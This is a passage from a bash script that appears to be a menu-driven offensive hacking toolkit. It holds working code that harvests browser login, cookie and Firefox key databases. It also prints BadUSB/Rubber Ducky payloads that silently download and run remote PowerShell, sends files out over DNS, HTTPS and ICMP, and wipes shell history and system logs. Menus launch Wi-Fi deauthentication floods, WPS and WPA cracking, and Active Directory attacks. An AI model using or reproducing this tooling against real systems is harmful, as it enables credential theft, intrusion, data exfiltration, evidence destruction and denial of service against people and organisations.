               addon_wait ;;
            4) read -p "URL: " U
               command -v qrencode >/dev/null 2>&1 || sudo apt install -y qrencode 2>&1 | tail -2
               qrencode -t ANSIUTF8 "$U"
               addon_wait ;;
            5) read -p "Gateway URL: " SMS_API_URL
               read -p "API key / token: " SMS_API_KEY
               read -p "Sender id / from number: " SMS_FROM
               echo -e "${GREEN}[+] stored this session${NC}"
               echo -e "${DIM}    To persist, add to ~/.bashrc:${NC}"
               echo -e "    export SMS_API_URL='...'"
               echo -e "    export SMS_API_KEY='...'"
               echo -e "    export SMS_FROM='...'"
               addon_wait ;;
            0) return ;;
        esac
    done
}

# ---- STEALTH ----
addon_browser_creds() {
    print_banner
    menu_header "B R O W S E R   C R E D   H A R V E S T"
    local out="$LOGS_DIR/browser_$(date +%s)"; mkdir -p "$out"; local f=0
    [ -d "$HOME/.config/google-chrome" ] && {
        cp "$HOME/.config/google-chrome/Default/Login Data" "$out/chrome_login.db" 2>/dev/null
        cp "$HOME/.config/google-chrome/Default/Cookies" "$out/chrome_cookies.db" 2>/dev/null
        cp "$HOME/.config/google-chrome/Default/History" "$out/chrome_history.db" 2>/dev/null
        f=1
    }
    [ -d "$HOME/.config/chromium" ] && { cp "$HOME/.config/chromium/Default/Login Data" "$out/chromium_login.db" 2>/dev/null; f=1; }
    [ -d "$HOME/.mozilla/firefox" ] && {
        find "$HOME/.mozilla/firefox" -name "logins.json" -exec cp {} "$out/" \; 2>/dev/null
        find "$HOME/.mozilla/firefox" -name "key4.db" -exec cp {} "$out/" \; 2>/dev/null
        f=1
    }
    [ $f -eq 0 ] && echo -e "${YELLOW}[!] no profiles${NC}" || { echo -e "${GREEN}[+] saved to $out${NC}"; ls "$out"; }
    menu_footer
    addon_wait
}

addon_post_enum() {
    print_banner
    menu_header "P O S T - E X P L O I T A T I O N   E N U M"
    echo -e "${CYAN}[*] System${NC}"; uname -a
    echo -e "${CYAN}[*] Shells${NC}"; grep -E "sh$" /etc/passwd
    echo -e "${CYAN}[*] Sudo${NC}"; sudo -l 2>/dev/null | head -20
    echo -e "${CYAN}[*] SUID${NC}"; find / -perm -4000 -type f 2>/dev/null | head -20
    echo -e "${CYAN}[*] Cron${NC}"; ls -la /etc/cron* 2>/dev/null | head -20
    echo -e "${CYAN}[*] Net${NC}"; ss -tulpn 2>/dev/null | head -20
    echo -e "${CYAN}[*] Procs${NC}"; ps aux --sort=-%cpu 2>/dev/null | head -10
    echo -e "${CYAN}[*] SSH keys${NC}"; find / -name "id_rsa" 2>/dev/null | head -5
    menu_footer
    addon_wait
}

addon_obfuscate() {
    print_banner
    menu_header "P A Y L O A D   O B F U S C A T I O N"
    read -p "$(echo -e ${YELLOW}'Payload: '${NC})" P
    [ -z "$P" ] && { addon_wait; return; }
    echo -e "${CYAN}-- Base64 --${NC}";   echo "$P" | base64 -w0; echo ""
    echo -e "${CYAN}-- Hex --${NC}";      echo -n "$P" | xxd -p | tr -d '\n'; echo ""
    echo -e "${CYAN}-- URL --${NC}";      python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$P"
    echo -e "${CYAN}-- ROT13 --${NC}";    echo "$P" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
    echo -e "${CYAN}-- Reversed --${NC}"; echo "$P" | rev
    menu_footer
    addon_wait
}

addon_wpa3_advanced() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "W P A 3   A D V A N C E D"
        phb_row "  -- CVE-2019-9494 / DRAGONBLOOD --" "${BOLD}${PINK}"
        phb_row "  [1]  Dragonblood check"       "${BOLD}${PINK}"
        phb_row "  [2]  SAE commit replay"       "${BOLD}${PINK}"
        phb_row "  [3]  Transition mode downgrade" "${BOLD}${PINK}"
        phb_row "  -- CAPTURE --" "${BOLD}${YELLOW}"
        phb_row "  [4]  WPA3 handshake capture"  "${BOLD}${YELLOW}"
        phb_div
        phb_row "  [0]  Back"                    "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) ensure_tool wpa_supplicant wpasupplicant
               echo -e "${DIM}    wpa_supplicant -dd, look for SAE downgrade${NC}"; addon_wait ;;
            2) echo -e "${DIM}    github.com/vanhoefm/dragonslayer${NC}"; addon_wait ;;
            3) do_scan && iw dev "$MONITOR_ACTUAL" scan 2>/dev/null | grep -A5 "$TARGET_BSSID" | grep -iE "RSN|SAE"; addon_wait ;;
            4) do_scan && ensure_monitor_on $TARGET_CHANNEL
               launch_xterm -bg black -fg '#ff5555' -title "WPA3 CAPTURE" -geometry $G_DEAUTH -e bash -c "hcxdumptool -i $MONITOR_ACTUAL -o /tmp/wpa3.pcapng; echo done; read"
               wait_xterm_done ;;
            0) return ;;
        esac
    done
}

addon_cellular() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "C E L L U L A R   /   S D R"
        command -v rtl_test >/dev/null 2>&1 || sudo apt install -y rtl-sdr 2>&1 | tail -2
        rtl_test -t 2>&1 | head -3
        phb_div
        phb_row "  -- GSM / LTE --" "${BOLD}${RED}"
        phb_row "  [1]  GSM band scan (900-950M)"   "${BOLD}${RED}"
        phb_row "  [2]  LTE band scan (1800-1900M)" "${BOLD}${RED}"
        phb_row "  -- CAPTURE --" "${BOLD}${MAGENTA}"
        phb_row "  [3]  GSM capture (gr-gsm)"       "${BOLD}${MAGENTA}"
        phb_row "  [4]  IMSI catcher (YateBTS)"    "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"                       "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) rtl_power -f 900M:950M:1M -i 10 -e 30 /tmp/gsm.csv; addon_wait ;;
            2) rtl_power -f 1800M:1900M:1M -i 10 -e 30 /tmp/lte.csv; addon_wait ;;
            3) echo -e "${DIM}    github.com/osmocom/gr-gsm${NC}"; addon_wait ;;
            4) echo -e "${DIM}    YateBTS + SDR hardware${NC}"; addon_wait ;;
            0) return ;;
        esac
    done
}

addon_physical() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "P H Y S I C A L   A C C E S S"
        phb_row "  -- PAYLOADS --" "${BOLD}${RED}"
        phb_row "  [1]  Rubber Ducky payload"  "${BOLD}${RED}"
        phb_row "  [2]  BadUSB Arduino sketch" "${BOLD}${RED}"
        phb_row "  [3]  Bash Bunny payload"    "${BOLD}${RED}"
        phb_row "  -- HARDWARE --" "${BOLD}${MAGENTA}"
        phb_row "  [4]  PCILeech info"         "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"                  "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) cat <<'RD'
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/p.ps1')"
ENTER
RD
               addon_wait ;;
            2) cat <<'BU'
#include <Keyboard.h>
void setup(){
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/p.ps1')");
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
}
void loop(){}
BU
               addon_wait ;;
            3) cat <<'BB'
LED R 100
ATTACKMODE HID STORAGE
RUN WIN powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/p.ps1')"
BB
               addon_wait ;;
            4) echo -e "${DIM}    github.com/ufrisk/pcileech${NC}"; addon_wait ;;
            0) return ;;
        esac
    done
}

addon_anonymity() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "A N O N Y M I T Y   T O O L S"
        phb_row "  -- IDENTITY --" "${BOLD}${SKY}"
        phb_row "  [1]  Randomize MAC"       "${BOLD}${SKY}"
        phb_row "  -- CHAINS --" "${BOLD}${VIOLET}"
        phb_row "  [2]  Proxychains"         "${BOLD}${VIOLET}"
        phb_row "  [3]  VPN chain info"      "${BOLD}${VIOLET}"
        phb_row "  -- VERIFY --" "${BOLD}${GREEN}"
        phb_row "  [4]  DNS leak test"       "${BOLD}${GREEN}"
        phb_div
        phb_row "  [0]  Back"                "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) ensure_tool macchanger; read -p "Interface [wlan0]: " IF; IF="${IF:-wlan0}"
               sudo ip link set "$IF" down; sudo macchanger -r "$IF"; sudo ip link set "$IF" up; addon_wait ;;
            2) command -v proxychains4 >/dev/null 2>&1 || sudo apt install -y proxychains4 2>&1 | tail -2
               echo -e "${DIM}    proxychains4 <cmd>${NC}"; addon_wait ;;
            3) echo -e "${DIM}    openvpn --config <file>${NC}"; addon_wait ;;
            4) curl -s https://www.dnsleaktest.com/ 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -5; addon_wait ;;
            0) return ;;
        esac
    done
}

addon_exfil() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "E X F I L T R A T I O N"
        phb_row "  -- CHANNELS --" "${BOLD}${RED}"
        phb_row "  [1]  DNS exfil"           "${BOLD}${RED}"
        phb_row "  [2]  HTTPS exfil"         "${BOLD}${RED}"
        phb_row "  [3]  ICMP exfil"          "${BOLD}${RED}"
        phb_row "  -- REPORT --" "${BOLD}${MAGENTA}"
        phb_row "  [4]  Generate HTML report" "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"                "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) read -p "File: " F; read -p "Domain: " D
               [ -f "$F" ] && [ -n "$D" ] || { addon_wait; return; }
               base64 -w0 "$F" | sed 's/.\{60\}/&./g' | while read -r ch; do dig +short "$ch.$D" >/dev/null; sleep 0.3; done
               echo -e "${GREEN}[+] done${NC}"; addon_wait ;;
            2) read -p "File: " F; read -p "URL: " U
               [ -f "$F" ] && [ -n "$U" ] || { addon_wait; return; }
               curl -s -X POST --data-binary "@$F" "$U"; echo -e "${GREEN}[+] sent${NC}"; addon_wait ;;
            3) read -p "File: " F; read -p "IP: " IP
               [ -f "$F" ] && [ -n "$IP" ] || { addon_wait; return; }
               command -v hping3 >/dev/null 2>&1 || sudo apt install -y hping3 2>&1 | tail -2
               xxd -p "$F" | while read -r line; do sudo hping3 -1 -c 1 -d "${#line}" -E /dev/stdin "$IP" <<< "$line" >/dev/null 2>&1; sleep 0.2; done
               echo -e "${GREEN}[+] done${NC}"; addon_wait ;;
            4) local rep="$LOGS_DIR/report_$(date +%s).html"
               { echo "<html><body><h1>PH0B14 Report</h1><p>$(date)</p><ul>"
                 ls "$LOGS_DIR" 2>/dev/null | while read -r f; do echo "<li>$f</li>"; done
                 echo "</ul></body></html>"; } > "$rep"
               echo -e "${GREEN}[+] $rep${NC}"; addon_wait ;;
            0) return ;;
        esac
    done
}

addon_ai_layer() {
    print_banner
    menu_header "A I   T A R G E T   S C O R I N G"
    read -p "$(echo -e ${YELLOW}'Nmap XML file: '${NC})" X
    [ -f "$X" ] || { echo -e "${RED}[!] not found${NC}"; addon_wait; return; }
    python3 - "$X" <<'PYEOF'
import sys, xml.etree.ElementTree as ET
try: root = ET.parse(sys.argv[1]).getroot()
except Exception as e: print("[!]", e); sys.exit(1)
scores = []
for host in root.iter('host'):
    ip = ''
    for a in host.iter('address'):
        if a.get('addrtype') == 'ipv4': ip = a.get('addr')
    ports = []
    for p in host.iter('port'):
        st = p.find('state')
        if st is None or st.get('state') != 'open': continue
        svc = p.find('service')
        name = svc.get('name') if svc is not None else '?'
        ver = (svc.get('product') or '') + ' ' + (svc.get('version') or '') if svc is not None else ''
        ports.append((p.get('portid'), name, ver.strip()))
    score = 0
    risky = ['smb','netbios','rdp','vnc','telnet','ftp','mysql','mssql','redis','mongodb','elasticsearch']
    for _, n, _ in ports:
        if n.lower() in risky: score += 10
    scores.append((score, ip, ports))
scores.sort(reverse=True)
for s, ip, ports in scores:
    print("=" * 50); print("TARGET: %s   SCORE: %d" % (ip, s))
    for p, n, v in ports: print("  %5s/tcp  %-12s %s" % (p, n, v))
PYEOF
    menu_footer
    addon_wait
}

addon_fuzz() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "F U Z Z I N G"
        phb_row "  -- HTTP --" "${BOLD}${MAGENTA}"
        phb_row "  [1]  HTTP param fuzz"     "${BOLD}${MAGENTA}"
        phb_row "  [2]  Path fuzz (ffuf)"    "${BOLD}${MAGENTA}"
        phb_row "  -- SERVICE / FILE --" "${BOLD}${RED}"
        phb_row "  [3]  Service fuzz"        "${BOLD}${RED}"
        phb_row "  [4]  Binary file fuzz"    "${BOLD}${RED}"
        phb_div
        phb_row "  [0]  Back"                "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) read -p "URL with FUZZ: " U
               command -v ffuf >/dev/null 2>&1 || sudo apt install -y ffuf 2>&1 | tail -2
               ffuf -u "$U" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40; addon_wait ;;
            2) read -p "Base URL: " U
               command -v ffuf >/dev/null 2>&1 || sudo apt install -y ffuf 2>&1 | tail -2
               ffuf -u "${U%/}/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40; addon_wait ;;
            3) echo -e "${DIM}    boofuzz framework${NC}"; addon_wait ;;
            4) read -p "Input file: " I
               command -v radamsa >/dev/null 2>&1 || sudo apt install -y radamsa 2>&1 | tail -2
               radamsa "$I" -o /tmp/fuzz_out -n 100
               echo -e "${GREEN}[+] 100 files in /tmp/fuzz_out${NC}"; addon_wait ;;
            0) return ;;
        esac
    done
}

addon_hardware() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "H A R D W A R E   I N T E G R A T I O N"
        phb_row "  -- DETECT --" "${BOLD}${CYAN}"
        phb_row "  [1]  Detect hardware"      "${BOLD}${CYAN}"
        phb_row "  -- FLASH --" "${BOLD}${ORANGE}"
        phb_row "  [2]  Flash ESP32"          "${BOLD}${ORANGE}"
        phb_row "  [3]  Flash ESP8266"        "${BOLD}${ORANGE}"
        phb_row "  -- INFO --" "${BOLD}${VIOLET}"
        phb_row "  [4]  Pineapple info"       "${BOLD}${VIOLET}"
        phb_row "  [5]  SDR info"             "${BOLD}${VIOLET}"
        phb_div
        phb_row "  [0]  Back"                 "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) echo -e "${CYAN}USB:${NC}"; lsusb 2>/dev/null
               echo -e "${CYAN}Serial:${NC}"; ls /dev/ttyUSB* /dev/ttyACM* 2>/dev/null
               echo -e "${CYAN}Net:${NC}"; ip -br link show; addon_wait ;;
            2) read -p "Port [/dev/ttyUSB0]: " P; P="${P:-/dev/ttyUSB0}"; read -p "Firmware: " F
               command -v esptool.py >/dev/null 2>&1 || pip3 install --break-system-packages esptool 2>&1 | tail -2
               esptool.py --port "$P" --baud 921600 write_flash 0x0 "$F"; addon_wait ;;
            3) read -p "Port [/dev/ttyUSB0]: " P; P="${P:-/dev/ttyUSB0}"; read -p "Firmware: " F
               command -v esptool.py >/dev/null 2>&1 || pip3 install --break-system-packages esptool 2>&1 | tail -2
               esptool.py --port "$P" write_flash 0x00000 "$F"; addon_wait ;;
            4) echo -e "${DIM}    Pineapple 172.16.42.1:1471${NC}"; addon_wait ;;
            5) rtl_test -t 2>&1 | head -5; addon_wait ;;
            0) return ;;
        esac
    done
}

addon_counter_forensics() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "C O U N T E R - F O R E N S I C S"
        phb_row "  -- LOGS / HISTORY --" "${BOLD}${RED}"
        phb_row "  [1]  Wipe bash history"     "${BOLD}${RED}"
        phb_row "  [2]  Wipe wtmp/btmp"        "${BOLD}${RED}"
        phb_row "  [3]  Wipe journal"          "${BOLD}${RED}"
        phb_row "  -- ARTIFACTS --" "${BOLD}${YELLOW}"
        phb_row "  [4]  Remove artifacts"      "${BOLD}${YELLOW}"
        phb_row "  [5]  Secure delete file"    "${BOLD}${YELLOW}"
        phb_div
        phb_row "  [0]  Back"                  "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) rm -f ~/.bash_history ~/.zsh_history; ln -sf /dev/null ~/.bash_history; echo -e "${GREEN}[+] done${NC}"; addon_wait ;;
            2) sudo shred -u /var/log/wtmp /var/log/btmp 2>/dev/null; sudo touch /var/log/wtmp /var/log/btmp; echo -e "${GREEN}[+] done${NC}"; addon_wait ;;
            3) sudo journalctl --rotate 2>/dev/null; sudo journalctl --vacuum-time=1s 2>/dev/null; echo -e "${GREEN}[+] done${NC}"; addon_wait ;;
            4) rm -rf /tmp/* 2>/dev/null; rm -rf ~/.cache/* 2>/dev/null; find /home -name "*.swp" -delete 2>/dev/null; echo -e "${GREEN}[+] done${NC}"; addon_wait ;;
            5) read -p "File: " F; [ -f "$F" ] && shred -u -n 7 "$F" && echo -e "${GREEN}[+] shredded${NC}"; addon_wait ;;
            0) return ;;
        esac
    done
}

# ---- Top-level submenus ----
menu_wpa3() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "W P A 3   A T T A C K S"
        phb_row "  -- BASIC --" "${BOLD}${PINK}"
        phb_row "  [1]  Scan for WPA3 networks" "${BOLD}${PINK}"
        phb_row "  [2]  SAE flood (DoS)"        "${BOLD}${PINK}"
        phb_row "  -- ADVANCED --" "${BOLD}${MAGENTA}"
        phb_row "  [3]  Dragonblood / SAE commit / downgrade" "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"                   "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" CH
        case "$CH" in
            1) do_scan && echo "WPA3 APs shown" && addon_wait ;;
            2) do_scan && ensure_monitor_on $TARGET_CHANNEL && launch_xterm -bg black -fg '#ff5555' -title "SAE FLOOD" -geometry $G_DEAUTH -e bash -c "aireplay-ng --ignore-negative-one --deauth 0 -a $TARGET_BSSID $MONITOR_ACTUAL; echo done; read" && wait_xterm_done ;;
            3) addon_wpa3_advanced ;;
            0) return ;;
        esac
    done
}

menu_enterprise() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "E N T E R P R I S E"
        phb_row "  [1]  hostapd-wpe info"       "${BOLD}${YELLOW}"
        phb_row "  [2]  Extract EAP identities" "${BOLD}${YELLOW}"
        phb_row "  [3]  asleap MSCHAPv2"        "${BOLD}${YELLOW}"
        phb_div
        phb_row "  [0]  Back"                   "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" CH
        case "$CH" in
            1) echo "sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf"; addon_wait ;;
            2) read -p "cap: " C; tshark -r "$C" -Y eap -T fields -e eap.identity; addon_wait ;;
            3) read -p "cap: " C; read -p "wordlist: " W; asleap -r "$C" -W "$W"; addon_wait ;;
            0) return ;;
        esac
    done
}

menu_handshake() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "H A N D S H A K E   /   P M K I D"
        phb_row "  -- CAPTURE --" "${BOLD}${SKY}"
        phb_row "  [1]  Capture WPA handshake" "${BOLD}${SKY}"
        phb_row "  [2]  Capture PMKID"         "${BOLD}${SKY}"
        phb_row "  [3]  Decloak SSIDs"         "${BOLD}${SKY}"
        phb_row "  -- CONVERT --" "${BOLD}${YELLOW}"
        phb_row "  [4]  Convert .cap to hc22000" "${BOLD}${YELLOW}"
        phb_row "  [5]  Show captures"         "${BOLD}${VIOLET}"
        phb_div
        phb_row "  [0]  Back"                  "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" CH
        case "$CH" in
            1) do_scan && hs_capture ;;
            2) do_scan && hs_pmkid ;;
            3) do_scan && hs_decloak ;;
            4) read -p "cap path: " CAP; hcxpcapngtool -o "${CAP%.*}.hc22000" "$CAP" 2>/dev/null; addon_wait ;;
            5) echo "Handshakes:"; ls -la "$HAND_DIR" 2>/dev/null; echo "PMKIDs:"; ls -la "$PMK_DIR" 2>/dev/null; addon_wait ;;
            0) return ;;
        esac
    done
}

menu_offline_wep_wps() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "O F F L I N E   /   W E P   /   W P S"
        phb_row "  -- WPA CRACK --" "${BOLD}${MAGENTA}"
        phb_row "  [1]  Crack WPA/WPA2 (auto)" "${BOLD}${MAGENTA}"
        phb_row "  [2]  Crack WPA/WPA2 (custom)" "${BOLD}${MAGENTA}"
        phb_row "  [3]  Hashcat crack"       "${BOLD}${MAGENTA}"
        phb_row "  [4]  Convert to hc22000"  "${BOLD}${MAGENTA}"
        phb_row "  -- WEP --" "${BOLD}${YELLOW}"
        phb_row "  [5]  WEP IV capture"      "${BOLD}${YELLOW}"
        phb_row "  [6]  WEP ARP replay"      "${BOLD}${YELLOW}"
        phb_row "  -- WPS --" "${BOLD}${PINK}"
        phb_row "  [7]  WPS wash"            "${BOLD}${PINK}"
        phb_row "  [8]  WPS pixie"           "${BOLD}${PINK}"
        phb_row "  [9]  WPS PIN brute"       "${BOLD}${PINK}"
        phb_div
        phb_row "  [0]  Back"                "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" CH
        case "$CH" in
            1) read -p "cap: " C
               [ ! -f "$C" ] && echo -e "${RED}[!] not found${NC}" && addon_wait && continue
               aircrack-ng -w "$WL_ROCKYOU" "$C"
               aircrack-ng -w "$WL_160M" "$C"
               aircrack-ng -w "$WL_NUMBERS" "$C"
               addon_wait ;;
            2) read -p "cap: " C; read -p "wordlist: " W; aircrack-ng -w "$W" "$C"; addon_wait ;;
            3) read -p "hc22000: " H; read -p "wordlist: " W; hashcat -m 22000 -a 0 "$H" "$W"; addon_wait ;;
            4) read -p "cap: " CAP; hcxpcapngtool -o "${CAP%.*}.hc22000" "$CAP" 2>/dev/null; addon_wait ;;
            5) do_scan && wep_capture ;;
            6) do_scan && wep_arp ;;
            7) wps_scan ;;
            8) wps_pixie ;;
            9) wps_pin ;;
            0) return ;;
        esac
    done
}

menu_dos() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "D E N I A L   O F   S E R V I C E"
        phb_row "  -- DEAUTH --" "${BOLD}${RED}"
        phb_row "  [1]  Deauth all"          "${BOLD}${RED}"
        phb_row "  [2]  Deauth client"       "${BOLD}${RED}"
        phb_row "  -- FLOOD --" "${BOLD}${ORANGE}"
        phb_row "  [3]  Auth flood (mdk4 a)" "${BOLD}${ORANGE}"
        phb_row "  [4]  Beacon flood"        "${BOLD}${ORANGE}"
        phb_div
        phb_row "  [0]  Back"                "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" CH
        case "$CH" in
            1) do_scan || { addon_wait; continue; }
               ensure_monitor_on $TARGET_CHANNEL
               launch_xterm -bg black -fg '#ff5555' -title "DEAUTH ALL" -geometry $G_DEAUTH -e bash -c "ip link set $MONITOR_ACTUAL down 2>/dev/null; iw dev $MONITOR_ACTUAL set type monitor 2>/dev/null; iw dev $MONITOR_ACTUAL set channel $TARGET_CHANNEL 2>/dev/null; ip link set $MONITOR_ACTUAL up 2>/dev/null; sleep 1; aireplay-ng --ignore-negative-one --deauth 0 -a $TARGET_BSSID $MONITOR_ACTUAL; echo; echo '>>> stopped'; read"
               wait_xterm_done ;;
            2) do_scan || { addon_wait; continue; }
               read -p "Client MAC: " C
               [ -z "$C" ] && addon_wait && continue
               ensure_monitor_on $TARGET_CHANNEL
               launch_xterm -bg black -fg '#ff5555' -title "DEAUTH CLIENT" -geometry $G_DEAUTH -e bash -c "ip link set $MONITOR_ACTUAL down 2>/dev/null; iw dev $MONITOR_ACTUAL set type monitor 2>/dev/null; iw dev $MONITOR_ACTUAL set channel $TARGET_CHANNEL 2>/dev/null; ip link set $MONITOR_ACTUAL up 2>/dev/null; sleep 1; aireplay-ng --ignore-negative-one --deauth 0 -a $TARGET_BSSID -c $C $MONITOR_ACTUAL; echo; echo '>>> stopped'; read"
               wait_xterm_done ;;
            3) do_scan || { addon_wait; continue; }
               ensure_monitor_on $TARGET_CHANNEL
               launch_xterm -bg black -fg '#ff5555' -title "AUTH FLOOD" -geometry $G_DEAUTH -e bash -c "ip link set $MONITOR_ACTUAL down 2>/dev/null; iw dev $MONITOR_ACTUAL set type monitor 2>/dev/null; iw dev $MONITOR_ACTUAL set channel $TARGET_CHANNEL 2>/dev/null; ip link set $MONITOR_ACTUAL up 2>/dev/null; sleep 1; mdk4 $MONITOR_ACTUAL a -a $TARGET_BSSID -c $TARGET_CHANNEL; echo; echo '>>> ended'; read"
               wait_xterm_done ;;
            4) phb_div
               phb_row "  -- BEACON FLOOD --" "${BOLD}${ORANGE}"
               phb_row "  [1]  Single SSID"     "${BOLD}${ORANGE}"
               phb_row "  [2]  Multiple SSIDs"  "${BOLD}${ORANGE}"
               phb_row "  [0]  Back"            "${RED}"
               read -p "Choice: " BF
               case "$BF" in 1) beacon_flood_single ;; 2) beacon_flood_multi ;; 0) ;; esac ;;
            0) return ;;
        esac
    done
}

menu_web_scan() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "W E B   S C A N   &   E X P L O I T"
        phb_row "  -- RECON --" "${BOLD}${LIME}"
        phb_row "  [1]  Full recon"       "${BOLD}${LIME}"
        phb_row "  [2]  Nikto scan"       "${BOLD}${LIME}"
        phb_row "  -- EXPLOIT --" "${BOLD}${RED}"
        phb_row "  [3]  SQL injection"    "${BOLD}${RED}"
        phb_row "  [4]  XSS probe"        "${BOLD}${RED}"
        phb_row "  [5]  Nuclei scan"      "${BOLD}${RED}"
        phb_row "  -- FUZZ --" "${BOLD}${MAGENTA}"
        phb_row "  [6]  Fuzzing"          "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"             "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" SC
        case "$SC" in
            1) web_recon ;;
            2) web_nikto ;;
            3) web_sqli_check ;;
            4) web_xss_probe ;;
            5) web_nuclei_scan ;;
            6) addon_fuzz ;;
            0) return ;;
        esac
    done
}

menu_web_dos() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "D E N I A L   O F   S E R V I C E"
        phb_row "  -- HTTP --" "${BOLD}${RED}"
        phb_row "  [1]  HTTP flood"       "${BOLD}${RED}"
        phb_row "  [2]  Slowloris"        "${BOLD}${RED}"
        phb_row "  -- NETWORK --" "${BOLD}${ORANGE}"
        phb_row "  [3]  SYN flood"        "${BOLD}${ORANGE}"
        phb_row "  [4]  UDP flood"        "${BOLD}${ORANGE}"
        phb_row "  -- MIX --" "${BOLD}${MAGENTA}"
        phb_row "  [5]  Multi-vector"     "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"             "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" DC
        case "$DC" in
            1) dos_http_flood ;;
            2) dos_slowloris ;;
            3) dos_syn_flood ;;
            4) dos_udp_flood ;;
            5) dos_multi ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

menu_ad() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "A C T I V E   D I R E C T O R Y"
        phb_row "  -- RECON --" "${BOLD}${CYAN}"
        phb_row "  [1]  Unauthenticated recon" "${BOLD}${CYAN}"
        phb_row "  [2]  Kerbrute (enum + spray)" "${BOLD}${CYAN}"
        phb_row "  [3]  AS-REP roast"          "${BOLD}${CYAN}"
        phb_row "  [4]  Kerberoast"            "${BOLD}${CYAN}"
        phb_row "  -- EXPLOIT --" "${BOLD}${RED}"
        phb_row "  [5]  CrackMapExec / netexec" "${BOLD}${RED}"
        phb_row "  [6]  NTLM relay + Responder" "${BOLD}${RED}"
        phb_row "  [7]  secretsdump"           "${BOLD}${RED}"
        phb_row "  [8]  BloodHound collection" "${BOLD}${RED}"
        phb_div
        phb_row "  [0]  Back"                  "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" AC
        case "$AC" in
            1) ad_recon ;;
            2) ad_kerbrute ;;
            3) ad_asreproast ;;
            4) ad_kerberoast ;;
            5) ad_cme ;;
            6) ad_relay ;;
            7) ad_secretsdump ;;
            8) ad_bloodhound ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

menu_internal() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "I N T E R N A L   S E R V I C E S"
        phb_row "  -- SCAN --" "${BOLD}${CYAN}"
        phb_row "  [1]  Full port + version + vuln scan" "${BOLD}${CYAN}"
        phb_row "  [2]  SearchSploit matching"          "${BOLD}${CYAN}"
        phb_row "  -- EXPLOIT --" "${BOLD}${RED}"
        phb_row "  [3]  Metasploit auto-import"         "${BOLD}${RED}"
        phb_row "  [4]  Database connect"               "${BOLD}${RED}"
        phb_row "  [5]  Weak credential sweep"          "${BOLD}${RED}"
        phb_div
        phb_row "  [0]  Back"                           "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" IC
        case "$IC" in
            1) internal_nmap_full ;;
            2) internal_searchsploit ;;
            3) internal_msf_autorun ;;
            4) internal_db_connect ;;
            5) internal_weak_creds ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

menu_cloud() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "C L O U D   /   C O N T A I N E R S"
        phb_row "  -- CONTAINERS --" "${BOLD}${RED}"
        phb_row "  [1]  Docker API exploit"    "${BOLD}${RED}"
        phb_row "  [2]  Kubernetes attacks"   "${BOLD}${RED}"
        phb_row "  -- CLOUD --" "${BOLD}${CYAN}"
